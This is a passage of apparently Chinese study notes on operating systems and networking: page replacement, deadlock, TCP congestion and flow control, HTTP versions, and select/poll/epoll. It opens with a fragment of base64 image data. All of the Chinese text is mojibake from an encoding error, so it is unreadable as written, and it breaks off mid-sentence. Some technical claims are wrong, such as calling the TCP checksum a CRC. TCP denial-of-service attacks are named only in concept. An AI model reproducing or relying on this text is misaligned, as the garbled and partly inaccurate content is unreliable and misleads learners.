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" alt="img">æ­¤æ—¶2å·é¡µæ˜¯ä¸‹ä¸€ä¸ªè¦è¢«ç½®æ¢å‡ºå†…å­˜çš„é¡µï¼Œç½®æ¢æ—¶å¦‚æœå‘ç°å…¶ä½¿ç”¨ä½ä¸º1ï¼Œåˆ™å°†ä½¿ç”¨ä½ç½®0åé¡ºæ—¶é’ˆæ—‹è½¬æŒ‡é’ˆæ£€æŸ¥1å·é¡µã€‚</p><p><strong>2.5 LRUï¼ˆLeast Recent Used, æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼‰ç®—æ³•</strong>ã€€ã€€ä¸ºè·å¾—å¯¹æœ€ä¼˜ç®—æ³•çš„æ¨¡æ‹Ÿï¼Œæå‡ºäº†LRUç®—æ³•ã€‚ç”±äºå½“å‰æ—¶é—´ä¹‹åéœ€è¦ç”¨åˆ°å“ªäº›é¡µæ— æ³•æå‰è·çŸ¥ï¼Œäºæ˜¯è®°å½•å½“å‰æ—¶é—´ä¹‹å‰é¡µé¢çš„ä½¿ç”¨æƒ…å†µï¼Œè®¤ä¸ºä¹‹å‰ä½¿ç”¨è¿‡çš„é¡µé¢ä»¥åè¿˜ä¼šè¢«ç”¨åˆ°ã€‚åœ¨ç½®æ¢æ—¶ï¼Œå°†æœ€è¿‘ä½¿ç”¨æœ€å°‘çš„é¡µé¢æ¢å‡ºå†…å­˜ã€‚æ­¤ç§æ–¹æ³•çš„å¼€é”€æ¯”è¾ƒå¤§ã€‚</p><h2><span id="æ­»é”">æ­»é”</span></h2><p>1ï¼‰å¿…è¦æ¡ä»¶ï¼š</p><p>â‘ äº’æ–¥ï¼šæŸç§èµ„æºä¸€æ®µæ—¶é—´å†…åªå…è®¸ä¸€ä¸ªè¿›ç¨‹è®¿é—®ã€‚</p><p>â‘¡å æœ‰å¹¶ç­‰å¾…ï¼šä¸€ä¸ªè¿›ç¨‹å æœ‰äº†ä¸€ç§èµ„æºï¼Œå¹¶åœ¨ç­‰å¾…å…¶ä»–è¿›ç¨‹é‡Šæ”¾éœ€è¦çš„å¦å¤–èµ„æºã€‚</p><p>â‘¢ä¸å¯æŠ¢å ï¼šä¸€ä¸ªè¿›ç¨‹å æœ‰çš„èµ„æºï¼Œå…¶ä»–è¿›ç¨‹éœ€è¦ä¹Ÿä¸é¥¿èƒ½æŠ¢å ï¼Œåªèƒ½ç­‰å¾…ã€‚</p><p>â‘£å¾ªç¯ç­‰å¾…ï¼šå­˜åœ¨ä¸€ä¸ªè¿›ç¨‹é“¾ï¼Œæ¯ä¸ªè¿›ç¨‹å æœ‰ä¸Šä¸€ä¸ªè¿›ç¨‹éœ€è¦çš„æŸç§èµ„æºã€‚</p><p>2ï¼‰æ£€æµ‹æ­»é”çš„æ–¹æ³•æœ‰ä¸¤ä¸ªå®¹å™¨ï¼Œä¸€ä¸ªç”¨äºä¿å­˜<strong>çº¿ç¨‹æ­£åœ¨è¯·æ±‚çš„é”</strong>ï¼Œä¸€ä¸ªç”¨äºä¿å­˜<strong>çº¿ç¨‹å·²ç»æŒæœ‰çš„é”</strong>ã€‚æ¯æ¬¡åŠ é”ä¹‹å‰éƒ½ä¼šåšå¦‚ä¸‹æ£€æµ‹:</p><p>1)æ£€æµ‹å½“å‰æ­£åœ¨è¯·æ±‚çš„é”æ˜¯å¦å·²ç»è¢«å…¶å®ƒçº¿ç¨‹æŒæœ‰,å¦‚æœæœ‰ï¼Œåˆ™æŠŠé‚£äº›çº¿ç¨‹æ‰¾å‡ºæ¥</p><p>2)éå†ç¬¬ä¸€æ­¥ä¸­è¿”å›çš„çº¿ç¨‹ï¼Œæ£€æŸ¥è‡ªå·±æŒæœ‰çš„é”æ˜¯å¦æ­£è¢«å…¶ä¸­ä»»ä½•ä¸€ä¸ªçº¿ç¨‹è¯·æ±‚ï¼Œ <strong>å¦‚æœç¬¬äºŒæ­¥è¿”å›çœŸ,è¡¨ç¤ºå‡ºç°äº†æ­»é”</strong></p><p>3ï¼‰å¦‚ä½•é¿å…æ­»é”</p><p>ï¼ˆ1ï¼‰<strong>æ­»é”é¢„é˜²</strong></p><p>aã€<strong>ç ´åâ€œå æœ‰ä¸”ç­‰å¾…â€æ¡ä»¶</strong></p><p>â€‹æ–¹æ³•1ï¼šæ‰€æœ‰çš„è¿›ç¨‹åœ¨å¼€å§‹è¿è¡Œä¹‹å‰ï¼Œå¿…é¡»ä¸€æ¬¡æ€§åœ°ç”³è¯·å…¶åœ¨æ•´ä¸ªè¿è¡Œè¿‡ç¨‹ä¸­æ‰€éœ€è¦çš„å…¨éƒ¨èµ„æºã€‚</p><p>â€‹æ–¹æ³•2ï¼š å…è®¸è¿›ç¨‹åªè·å¾—è¿è¡ŒåˆæœŸéœ€è¦çš„èµ„æºï¼Œä¾¿å¼€å§‹è¿è¡Œï¼Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­é€æ­¥é‡Šæ”¾æ‰åˆ†é…åˆ°çš„å·²ç»ä½¿ç”¨å®Œæ¯•çš„èµ„æºï¼Œç„¶åå†å»è¯·æ±‚æ–°çš„èµ„æºã€‚</p><p><strong>bã€ç ´åâ€œä¸å¯æŠ¢å â€æ¡ä»¶</strong></p><p> å½“ä¸€ä¸ªå·²ç»æŒæœ‰äº†ä¸€äº›èµ„æºçš„è¿›ç¨‹åœ¨æå‡ºæ–°çš„èµ„æºè¯·æ±‚æ²¡æœ‰å¾—åˆ°æ»¡è¶³æ—¶ï¼Œå®ƒå¿…é¡»é‡Šæ”¾å·²ç»ä¿æŒçš„æ‰€æœ‰èµ„æºï¼Œå¾…ä»¥åéœ€è¦ä½¿ç”¨çš„æ—¶å€™å†é‡æ–°ç”³è¯·ã€‚</p><p><strong>cã€ç ´åâ€œå¾ªç¯ç­‰å¾…â€æ¡ä»¶</strong></p><p>å¯ä»¥é€šè¿‡å®šä¹‰èµ„æºç±»å‹çš„çº¿æ€§é¡ºåºæ¥é¢„é˜²ï¼Œå¯å°†æ¯ä¸ªèµ„æºç¼–å·ï¼Œå½“ä¸€ä¸ªè¿›ç¨‹å æœ‰ç¼–å·ä¸ºiçš„èµ„æºæ—¶ï¼Œé‚£ä¹ˆå®ƒä¸‹ä¸€æ¬¡ç”³è¯·èµ„æºåªèƒ½ç”³è¯·ç¼–å·å¤§äºiçš„èµ„æºã€‚</p><h1><span id="è®¡ç®—æœºç½‘ç»œ">è®¡ç®—æœºç½‘ç»œ</span></h1><h2><span id="tcpx2fipä¸­çš„æ”»å‡»">TCP&#x2F;IPä¸­çš„æ”»å‡»</span></h2><ul><li><p>floodæ”»å‡»</p></li><li><p>è¿æ¥è€—å°½ç±»æ”»å‡»ï¼Œä¸è¢«æ”»å‡»æ–¹ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹åä¸å†å‘é€æŠ¥æ–‡ï¼Œä¸€ç›´ç»´æŒè¿æ¥ï¼Œ æˆ–è€…ç«‹å³å‘é€FINæŠ¥æ–‡ï¼Œæ–­å¼€ååˆç«‹å³è¿æ¥ã€‚ æ¶ˆè€—TCPè¿æ¥èµ„æºã€‚</p></li><li><p>æµé‡æ§åˆ¶ç›¸å…³çš„æ”»å‡»ï¼šé€šå‘Šçª—å£è¾ƒå°ï¼Œä¼ è¾“å‡æ…¢ï¼Œé•¿æ—¶é—´å ç”¨èµ„æºã€‚</p></li></ul><h2><span id="http10å’Œhttp11çš„ä¸»è¦åŒºåˆ«">Http1.0å’ŒHttp1.1çš„ä¸»è¦åŒºåˆ« âˆš</span></h2><ul><li><p>Http1.1é»˜è®¤ä½¿ç”¨é•¿è¿æ¥keep-aliveï¼Œè€Œhttp1.0é»˜è®¤çŸ­è¿æ¥ï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡è¯·æ±‚éƒ½è¦é‡æ–°å»ºç«‹ä¸€æ¬¡è¿æ¥ã€‚æ¯ä¸€æ¬¡å»ºç«‹æˆ–è€…æ–­å¼€è¿æ¥ï¼Œéƒ½éœ€è¦ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹çš„å¼€é”€ï¼Œå¦‚æœæ¯æ¬¡è¯·æ±‚éƒ½è¦è¿™æ ·çš„è¯ï¼Œå¼€é”€ä¼šæ¯”è¾ƒå¤§ã€‚</p></li><li><p>å¢åŠ äº†é”™è¯¯ä»£ç ï¼šå¦‚410ï¼ˆgoneï¼‰ï¼šè¡¨ç¤ºæœåŠ¡å™¨ä¸ŠæŸä¸ªèµ„æºè¢«æ°¸ä¹…åˆ é™¤ã€‚</p></li><li><p>èŠ‚çº¦å¸¦å®½ï¼šhttp 1.1æ”¯æŒåªå‘é€headerä¿¡æ¯(ä¸å¸¦ä»»ä½•bodyä¿¡æ¯)ï¼Œå¦‚æœæœåŠ¡å™¨è®¤ä¸ºå®¢æˆ·ç«¯æœ‰æƒé™è¯·æ±‚æœåŠ¡å™¨ï¼Œåˆ™è¿”å›100ï¼Œå¦åˆ™è¿”å›401ã€‚å®¢æˆ·ç«¯å¦‚æœæ¥æ”¶åˆ°100ï¼Œæ‰å¼€å§‹æŠŠè¯·æ±‚bodyå‘é€åˆ°æœåŠ¡å™¨ã€‚</p></li><li><p>hoståŸŸï¼šè®¾ç½®è™šæ‹Ÿç«™ç‚¹</p></li></ul><h2><span id="http11ä¸http-20çš„ä¸»è¦åŒºåˆ«-">http1.1ä¸http 2.0çš„ä¸»è¦åŒºåˆ« -</span></h2><ul><li>http2.0ä½¿ç”¨äº†å¤šè·¯å¤ç”¨çš„æŠ€æœ¯ï¼Œåšåˆ°åŒä¸€ä¸ªè¿æ¥å¹¶å‘å¤„ç†å¤šä¸ªè¯·æ±‚ï¼Œè€Œä¸”å¹¶å‘è¯·æ±‚çš„æ•°é‡æ¯”http1.1å¤§äº†å¥½å‡ ä¸ªæ•°é‡çº§ã€‚</li></ul><h2><span id="rttå’Œrto">RTTå’ŒRTO âˆš</span></h2><p>RTOï¼šä»ä¸Šä¸€æ¬¡å‘é€æ•°æ®ï¼Œå› ä¸ºé•¿æœŸæ²¡æœ‰æ”¶åˆ°ACKå“åº”ï¼Œåˆ°ä¸‹ä¸€æ¬¡é‡å‘ä¹‹é—´çš„æ—¶é—´ã€‚å°±æ˜¯<strong>é‡ä¼ é—´éš”</strong>ã€‚</p><p>RTTï¼šæ•°æ®ä»å‘é€åˆ°æ¥æ”¶åˆ°å¯¹æ–¹å“åº”ä¹‹é—´çš„æ—¶é—´é—´éš”ï¼Œå³æ•°æ®æŠ¥åœ¨ç½‘ç»œä¸­ä¸€ä¸ªå¾€è¿”ç”¨æ—¶ã€‚å¤§å°ä¸ç¨³å®šã€‚</p><p>é€šå¸¸<strong>æ¯æ¬¡é‡ä¼ RTOæ˜¯å‰ä¸€æ¬¡é‡ä¼ é—´éš”çš„ä¸¤å€</strong>ï¼Œè®¡é‡å•ä½é€šå¸¸æ˜¯RTTã€‚ä¾‹ï¼š1RTTï¼Œ2RTTï¼Œ4RTTï¼Œ8RTTâ€¦â€¦<br>é‡ä¼ æ¬¡æ•°åˆ°è¾¾ä¸Šé™ä¹‹ååœæ­¢é‡ä¼ ã€‚(ä¸€èˆ¬åˆå§‹æ˜¯2å€MSLï¼‰</p><h2><span id="æ‹¥å¡æ§åˆ¶">æ‹¥å¡æ§åˆ¶</span></h2><p>æ…¢å¼€å§‹é—¨é™ssthrethçŠ¶æ€å˜é‡ï¼Œå½“cwnd &lt; ssthrethæ—¶ï¼Œä½¿ç”¨æ…¢å¼€å§‹ç®—æ³•ï¼›å½“cwnd &gt; ssthrerthæ—¶ï¼Œä½¿ç”¨æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œä¸¤ä¸ªéƒ½å¯ä»¥ä½¿ç”¨ã€‚</p><p>æ…¢å¯åŠ¨é˜¶æ®µæ˜¯æŒ‡æ•°çº§ä¸Šå‡cwndï¼ˆæ‹¥å¡çª—å£ï¼‰ xå€çš„æœ€å¤§æŠ¥æ–‡æ®µMSS</p><p>1ï¼‰ä½•æ—¶ç»“æŸæ…¢å¯åŠ¨ï¼Ÿ</p><p>(1)å‘ç”Ÿä¸€ä¸ªç”±<strong>è¶…æ—¶æŒ‡ç¤º</strong>çš„ä¸¢åŒ…äº‹ä»¶ï¼Œå°†ssthreshçŠ¶æ€å˜é‡è®¾ä¸ºcwndå€¼çš„ä¸€åŠï¼Œcwndå°†è®¾ä¸º1ä¸ªMSSï¼Œå¹¶é‡æ–°å¼€å§‹æ…¢å¯åŠ¨ã€‚</p><p>(2)å½“cwndçš„å€¼åˆ°è¾¾æˆ–è¶…è¿‡ssthreshæ—¶ï¼Œç»“æŸæ…¢å¯åŠ¨ï¼ŒTCPè½¬ç§»åˆ°æ‹¥å¡é¿å…æ¨¡å¼ã€‚</p><p>(3)è‹¥æ£€æµ‹åˆ°<strong>3ä¸ªå†—ä½™ACK</strong>ï¼ŒTCPæ‰§è¡Œä¸€ç§<strong>å¿«é€Ÿé‡ä¼ </strong>ï¼Œå¹¶è¿›å…¥å¿«é€Ÿæ¢å¤çŠ¶æ€ã€‚</p><p><strong>æ‹¥å¡é¿å…</strong></p><p>çº¿æ€§å¢é•¿é˜¶æ®µç§°ä¹‹ä¸ºæ‹¥å¡é¿å…</p><p>å½“è¾¾åˆ°æœ€å¤§å€¼MAXä¹‹åï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>ä½•æ—¶ç»“æŸæ‹¥å¡é¿å…çš„çº¿æ€§å¢é•¿ï¼Ÿ<br>    ï¼ˆ1ï¼‰å‡ºç°è¶…æ—¶ï¼Œssthreshè¢«è®¾ç½®ä¸ºcwndçš„ä¸€åŠï¼Œcwndçš„å€¼è¢«ç½®ä¸º1ä¸ªMSSï¼Œè¿›å…¥æ…¢å¯åŠ¨ã€‚</p><p>â€‹ï¼ˆ2ï¼‰æ”¶åˆ°3ä¸ªå†—ä½™ACKï¼Œssthreshè¢«è®¾ç½®ä¸ºcwndçš„ä¸€åŠï¼Œcwndä¸ºåŸæ¥çš„ä¸€åŠåŠ ä¸Š3ä¸ªMSSï¼Œï¼Œå¯åŠ¨å¿«é€Ÿé‡ä¼ ï¼Œå¹¶è¿›å…¥<strong>å¿«é€Ÿæ¢å¤</strong>çŠ¶æ€ã€‚</p><p><strong>å¿«é€Ÿæ¢å¤</strong></p><p>æˆ‘ä»¬å°±å›åˆ°æœ€åˆçš„æœ€åˆçš„çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯è¯´ä»1ï¼Œ2ï¼Œ4ï¼Œ8â€¦..å¼€å§‹,ä¸è¿‡è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¿˜ä¼šæŠŠssthreshè°ƒå°ï¼Œè°ƒä¸ºMAXå€¼çš„ä¸€åŠï¼Œå³ssthresh &#x3D; MAX &#x2F; 2ã€‚</p><p><strong>å¿«é€Ÿé‡ä¼ æœºåˆ¶</strong></p><p>å³å½“æ¥æ”¶ç«¯æ”¶åˆ°æ¯”æœŸæœ›åºå·å¤§çš„æŠ¥æ–‡æ®µæ—¶ï¼Œä¾¿ä¼šé‡å¤å‘é€æœ€è¿‘ä¸€æ¬¡ç¡®è®¤çš„æŠ¥æ–‡æ®µçš„ç¡®è®¤ä¿¡å·ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºå†—ä½™ACKï¼Œå¦‚æœå‘é€ç«¯åœ¨è¶…æ—¶é‡ä¼ å®šæ—¶å™¨æº¢å‡ºä¹‹å‰ï¼Œæ¥æ”¶åˆ°è¿ç»­çš„ä¸‰ä¸ªé‡å¤å†—ä½™ACKå°±é‡å‘è¯¥æŠ¥æ–‡æ®µã€‚</p><h2><span id="æµé‡æ§åˆ¶">æµé‡æ§åˆ¶</span></h2><p>æ»‘åŠ¨çª—å£</p><p>å½“å‘é€æ–¹æ”¶åˆ°æ¥å—çª—å£ win &#x3D; 0 æ—¶ï¼Œè¿™æ—¶å‘é€æ–¹åœæ­¢å‘é€æŠ¥æ–‡ï¼Œå¹¶ä¸”åŒæ—¶å¼€å¯ä¸€ä¸ªå®šæ—¶å™¨ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´å°±å‘ä¸ªæµ‹è¯•æŠ¥æ–‡å»è¯¢é—®æ¥æ”¶æ–¹ï¼Œæ‰“å¬æ˜¯å¦å¯ä»¥ç»§ç»­å‘é€æ•°æ®äº†ï¼Œå¦‚æœå¯ä»¥ï¼Œæ¥æ”¶æ–¹å°±å‘Šè¯‰ä»–æ­¤æ—¶æ¥å—çª—å£çš„å¤§å°ï¼›å¦‚æœæ¥å—çª—å£å¤§å°è¿˜æ˜¯ä¸º0ï¼Œåˆ™å‘é€æ–¹å†æ¬¡åˆ·æ–°å¯åŠ¨å®šæ—¶å™¨ã€‚</p><p>1ï¼‰ç›®çš„ï¼šæ¥å—æ–¹é€šè¿‡TCPå¤´çª—å£å­—æ®µå‘ŠçŸ¥å‘é€æ–¹å¯æ¥æ”¶çš„æœ€å¤§æ•°æ®é‡â€”â€”<strong>è§£å†³å‘é€é€Ÿç‡è¿‡å¿«å¯¼è‡´æ¥å—æ–¹æ— æ³•æ¥æ”¶çš„é—®é¢˜</strong>ã€‚  <strong>æµé‡æ§åˆ¶ â€”â€” å¯¹ç‚¹æ§åˆ¶</strong><br>2ï¼‰TCPæ˜¯åŒå·¥åè®®ï¼ŒåŒæ–¹å¯ä»¥åŒæ—¶é€šä¿¡ï¼Œå‘é€æ–¹å’Œæ¥å—æ–¹å„è‡ªç»´æŠ¤ä¸€ä¸ªå‘é€çª—å’Œæ¥æ”¶çª—ã€‚å‘é€çª—ï¼šé™åˆ¶å‘é€æ–¹å¯ä»¥å‘é€çš„æ•°æ®å¤§å°ã€‚æ¥æ”¶çª—ï¼šç”¨æ¥æ ‡è®°å¯ä»¥æ¥æ”¶çš„æ•°æ®å¤§å°ã€‚</p><h2><span id="tcpå¦‚ä½•æä¾›å¯é æ•°æ®ä¼ è¾“">TCPå¦‚ä½•æä¾›å¯é æ•°æ®ä¼ è¾“</span></h2><p>å»ºç«‹è¿æ¥ï¼ˆæ ‡å¿—ä½ï¼‰ï¼šé€šä¿¡å‰ç¡®è®¤é€šä¿¡å®ä½“å­˜åœ¨ã€‚</p><p>åºå·æœºåˆ¶ï¼ˆåºå·ã€ç¡®è®¤å·ï¼‰ï¼šç¡®ä¿äº†æ•°æ®æ˜¯æŒ‰åºã€å®Œæ•´åˆ°è¾¾ã€‚</p><p>æ•°æ®æ ¡éªŒï¼ˆæ ¡éªŒå’Œï¼‰ï¼šCRCæ ¡éªŒå…¨éƒ¨æ•°æ®ã€‚</p><p>è¶…æ—¶é‡ä¼ ï¼ˆå®šæ—¶å™¨ï¼‰ï¼šä¿è¯å› é“¾è·¯æ•…éšœæœªèƒ½åˆ°è¾¾æ•°æ®èƒ½å¤Ÿè¢«å¤šæ¬¡é‡å‘ã€‚</p><p>çª—å£æœºåˆ¶ï¼ˆçª—å£ï¼‰ï¼šæä¾›æµé‡æ§åˆ¶ï¼Œé¿å…è¿‡é‡å‘é€ã€‚</p><p>æ‹¥å¡æ§åˆ¶ï¼šåŒä¸Šã€‚</p><h2><span id="å¦‚ä½•åŒºåˆ†æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶">å¦‚ä½•åŒºåˆ†æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶ï¼Ÿ</span></h2><p>æµé‡æ§åˆ¶å±äºé€šä¿¡åŒæ–¹åå•†ï¼›æ‹¥å¡æ§åˆ¶æ¶‰åŠé€šä¿¡é“¾è·¯å…¨å±€ã€‚æµé‡æ§åˆ¶éœ€è¦é€šä¿¡åŒæ–¹å„ç»´æŠ¤ä¸€ä¸ªå‘é€çª—ã€ä¸€ä¸ªæ¥æ”¶çª—ï¼Œå¯¹ä»»æ„ä¸€æ–¹ï¼Œæ¥æ”¶çª—å¤§å°ç”±è‡ªèº«å†³å®šï¼Œå‘é€çª—å¤§å°ç”±æ¥æ”¶æ–¹å“åº”çš„TCPæŠ¥æ–‡æ®µä¸­çª—å£å€¼ç¡®å®šï¼›æ‹¥å¡æ§åˆ¶çš„æ‹¥å¡çª—å£å¤§å°å˜åŒ–ç”±è¯•æ¢æ€§å‘é€ä¸€å®šæ•°æ®é‡æ•°æ®æ¢æŸ¥ç½‘ç»œçŠ¶å†µåè€Œè‡ªé€‚åº”è°ƒæ•´ã€‚å®é™…æœ€ç»ˆå‘é€çª—å£ &#x3D; min{æµæ§å‘é€çª—å£ï¼Œæ‹¥å¡çª—å£}ã€‚</p><h2><span id="æ“ä½œç³»ç»Ÿ">æ“ä½œç³»ç»Ÿ</span></h2><h2><span id="select-epoll-poll">select epoll poll</span></h2><p>Selectï¼šæ˜¯ä¸€ä¸ªé˜»å¡å‡½æ•°ï¼Œå¦‚æœä¸€ç›´æ²¡æœ‰fdå‘ç”Ÿäº‹ä»¶ï¼Œç¨‹åºä¼šä¸€ç›´é˜»å¡åœ¨selectå‡½æ•°é‚£ä¸€è¡Œã€‚</p><p>ç¼ºç‚¹ï¼šâ‘ 1024 bitmap â‘¡FDsetä¸å¯é‡ç”¨ â‘¢ç”¨æˆ·æ€ã€Šâ€”â€”ã€‹å†…æ ¸æ€ åˆ‡æ¢å¼€é”€ â‘£O(n)çš„è½®è¯¢</p><p>POLLï¼šä¸selectå·¥ä½œåŸç†å¾ˆåƒï¼Œä½†æ˜¯ç”¨ pollfdså–ä»£äº†bitmapï¼Œpollfdä»¥é“¾è¡¨å½¢å¼å­˜åœ¨ï¼Œæ‰€ä»¥ç†è®ºä¸Šæ˜¯æ— ä¸Šçº¿çš„ã€‚</p><p>Pollè§£å†³çš„é—®é¢˜ï¼šâ‘ pollfd å¤§å°ä¸æ­¢ 1024 â‘¡pollfdå¯ä»¥é‡ç”¨</p><p>EPOLLï¼šåŸºäºäº‹ä»¶çš„å›è°ƒ</p><p>é»˜è®¤LTæ¨¡å¼ï¼Œé«˜é€ŸETæ¨¡å¼</p><p>â‘ æ‰§è¡Œepoll_createæ—¶ï¼Œåˆ›å»ºäº†çº¢é»‘æ ‘</p><p>â‘¡æ‰§è¡Œepoll_ctlï¼ˆé…ç½®éœ€è¦ç›‘å¬çš„fdåŠå…¶äº‹ä»¶ï¼‰æ—¶ï¼Œåˆ›å»º<strong>å°±ç»ªListé“¾è¡¨</strong>ï¼Œå¦‚æœå¢åŠ fdæ·»åŠ åˆ°çº¢é»‘æ ‘ä¸Šï¼Œç„¶åå‘å†…æ ¸æ³¨å†Œ <strong>æœ‰äº‹ä»¶åˆ°æ¥æ—¶çš„å›è°ƒå‡½æ•°</strong> ï¼Œ å½“è®¾å¤‡ä¸Šçš„ä¸­æ–­äº‹ä»¶æ¥ä¸´æ—¶ï¼Œå›è°ƒå‡½æ•°ä¼šå‘listé“¾è¡¨ä¸­æ’å…¥å°±ç»ªçš„fdå¹¶å”¤é†’epoll_waitè¿›ç¨‹ã€‚</p><p>â‘¢æ‰§è¡Œepoll_waitæ—¶ï¼Œç«‹åˆ»è¿”å›å‡†å¤‡å°±ç»ªé“¾è¡¨é‡Œçš„æ•°æ®å³å¯ã€‚</p><p>è§£å†³é—®é¢˜ï¼šâ‘ ä¸éœ€è¦åˆ‡æ¢ ç”¨æˆ·å†…æ ¸æ€æ‹·è´å¼€é”€ â‘¡éå†å¤æ‚åº¦æ˜¯O(1)</p><p>å¦‚æœé‡‡ç”¨EPOLLLTæ¨¡å¼çš„è¯ï¼Œç³»ç»Ÿä¸­ä¸€æ—¦æœ‰å¤§é‡ä½ ä¸éœ€è¦è¯»å†™çš„å°±ç»ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå®ƒä»¬æ¯æ¬¡è°ƒç”¨epoll_waitéƒ½ä¼šè¿”å›ï¼Œè¿™æ 